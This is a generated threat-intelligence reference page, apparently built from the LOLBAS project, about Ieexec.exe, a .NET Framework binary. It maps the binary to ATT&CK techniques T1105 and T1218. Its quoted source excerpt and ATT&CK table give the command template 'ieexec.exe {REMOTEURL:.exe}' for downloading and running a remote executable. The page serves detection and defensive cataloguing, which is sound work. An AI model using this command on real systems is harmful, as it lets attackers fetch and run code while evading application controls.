---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ieexec.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ieexec.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ieexec.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/ieexec.md)
- Source verification: [source record](../../sources/lolbas/ieexec.exe.md)

## Aliases

- `Ieexec.exe`
- `ieexec.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: ieexec.exe {REMOTEURL:.exe} |
| [T1218 - System Binary Proxy Execution](../../attack/techniques/T1218-system-binary-proxy-execution.md) | explicit | source | Command metadata lists T1218: ieexec.exe {REMOTEURL:.exe} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/ieexec.exe.md)

## Source Verification

[source record](../../sources/lolbas/ieexec.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@subtee'
Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: Download
Command: ieexec.exe {REMOTEURL:.exe}
Description: Downloads and executes executable from the remote server.
```
